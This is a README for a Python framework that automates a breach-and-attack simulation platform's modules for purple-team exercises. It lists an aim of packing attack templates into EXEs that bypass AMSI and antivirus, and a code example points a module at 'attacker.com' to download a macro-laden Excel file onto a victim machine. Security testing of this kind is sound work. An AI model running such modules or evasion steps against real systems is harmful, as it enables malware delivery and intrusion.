# cymulate-framework

![](https://i.imgur.com/B9Z8nyQ.png)

- **ⓘ Note**: This project is still under development and not ready for production use.

- **⚠ Warning**: Do not run this project on production environment if you have no idea what you are doing.

## Introduction

The framework to automate Cymulate's modules and templates for purple team.

**What is Cymulate?**

> [Cymualte](https://cymulate.com/) is a BAS (Break and Attack Simulation) platform that provides a comprehensive set of attack simulations based on the **MITRE ATT&CK® framework** to test the effectiveness of your security controls.

This project is aimed to help Purple Team to:
- **Red part** : Construct fully customizable and automated APT attacks easily.
- **Blue part** : Test their security defenses against APT attacks easily.

## Functionality

- [ ] Scrape modules and templates from Cymulate and transform them into scripts.
- [ ] Automate the execution of templates such as APT, Phishing, etc.
- [ ] Generate standalone EXE for templates and bypass AMSI, Antivirus

## Usage

Make sure `python 3.11+` and `poetry` are installed:

- **Python 3.11+** - https://www.python.org/downloads/
- **Poetry** - https://python-poetry.org/docs/#installation

```bash
git clone https://github.com/opabravo/cymulate-framework
cd cymulate-framework

# Install required python packages
poetry install

# Activate virtual environment
poetry shell

# Run default template (APT34)
python main.py

# Run desired execution module by id
python main.py <module_id>

# Ex:
python main.py 62385f03a0e69ed2274622cc
```

Batch Scripts:

- `client_start.bat` - Reset and update to the latest version of the framework then run `main.py`

## How it works

Cymulate's execution module have 5 main steps:

1. **Check dependency** - Check if required dependencies are installed.
2. **Execution** -Run the mitre ATT&CK technique execution.
3. **Success Indicate** - Check if the attack was successful via parsing execution output or check exit code.
4. **Output Parsing** - Parse the output of the execution for further uses.
5. **Cleanup** - Clean up the execution environment.

The framework will automate the execution of the above steps.

## Customization

We can pass self defined parameters to the execution module like this:

```python
# Import windows module from core
from core.module.windows import WindowsModule

# Create a windows module instance
execution = WindowsModule("62385f03a0e69ed2274622cc", log_level="DEBUG")

# Update the input arguments to your own ones
execution.input_arguments.update({
    "download_file_url": "https://attacker.com/very_dangerous_excel.xlsx",
    "download_file_path": "$env:userprofile\Downloads\Income.xlsm",
})

# Execute the module after initialization
execution.run()
```

## Development

### Blueprint

- `Basic structure` - The basic structure of the project.
- `APT template` - APT template automation test.
- `Scrape modules and templates` - Scrape modules and templates via Cymulate's [API](https://api.app.cymulate.com/docs/#/)
- `Transform modules and templates` - Transform modules and templates into cymulate-framework modules.
- `Automate execution` - Automate the execution of templates.
- `APT Script generator` - Generate scripts for APT template with extracted specific execution scripts (don't wanna load the 20+mb json file) and load corresponding required 3rd party pip packages into scripts
- `Pack Script to EXE` - Pack generated template script with its requirements(pip packages, execution scripts) into EXE via `pyisntaller`, `py2exe` or `Nuitka`
- `ClI` - A CLI to interact with the framework.

### Notes

- Using `builtin dataclass` + `dacite` for JSON deserializing model instead of `pydantic` since `dacite` is enough for the purpose.

## Contributing

Feel free to submit pull requests and issues.

## License

[MIT](https://choosealicense.com/licenses/mit/)
